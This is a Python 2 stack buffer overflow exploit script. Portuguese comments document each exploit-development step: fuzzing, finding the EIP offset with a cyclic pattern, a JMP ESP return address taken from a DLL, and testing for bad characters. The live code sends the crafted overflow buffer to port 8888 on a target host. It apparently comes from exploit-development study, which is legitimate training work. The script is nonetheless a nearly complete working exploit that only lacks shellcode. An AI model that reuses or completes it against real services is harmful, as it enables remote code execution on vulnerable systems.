#!/usr/bin/python

import sys, socket
from struct import *

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

# passo 1 - teste de conectividade
# buffer = "A" * 1000

# passo 2 - vem do passo1, em que com um fuzzer, descobre-se que a aplicacao crasheia, e assim, contador=500
# outro arquivo, pois o poc nao precisa fazer loop

# passo 3 - gera-se uma string com msf-pattern-create -l 500 (vindo de passo2-fuzzing). Assim, descobre-se o endereco exato em que aplicacao crashei, encontrado o eip
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"

# passo 4 - sabemos de passo 3 que o offset e 452, pois o conteudo de eip apos o envio de poc3 ficou 31704130, e ao darmos msf-pattern_offset -q 31704130 ficou 452
# offset = "A" * 452
# eip = "BBBB"
# esp = "C" * 400

# passo 5  - temos que o offset e 452, e agora controlamos eip. Agora achamos esp para que possamos preencher com o shellcode. Assim, precisamos que o eip salte para o esp. Digitamos no immunity debugger !mona jmp -r esp e acessamos no log para verificar um endereco de uma dependencia, pois as dlls possuem endereco fixo. Pegamos o endereco da lib helvio, que eh 6B841615.
# offset = "A" * 452
# eip = pack('<L',0x6B841615)
# esp = "C" * 400

# passo 6 - descobrir quais badchars dao problema na aplicacao.  tres badchars consagrados - 00 0a 0x (nullbyte, carriage return e pular linha - 00, \r, \n ). Envia o bytearay, coloca breakpoint e compara o bytearray enviado atraves do comando do mona !mona compare -f c:\logs\aplicacao\bytearray.bin -a [endereco-onde-se-encontra01 02 03 04], que e 0022fb78  
offset = "A" * 452
eip = pack('<L',0x6B841615)
# esp = "C" * 400
bytearray = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22"
 "\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42"
 "\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62"
 "\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
 "\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2"
 "\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
 "\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2"
 "\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

esp = bytearray

buffer = offset + eip + esp

buffer += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 8888))
print s.recv(1024)
# print "Sending evil buffer de %s bytes" %contador
print buffer
s.send(buffer)
print "[+] buffer enviado"
s.close()



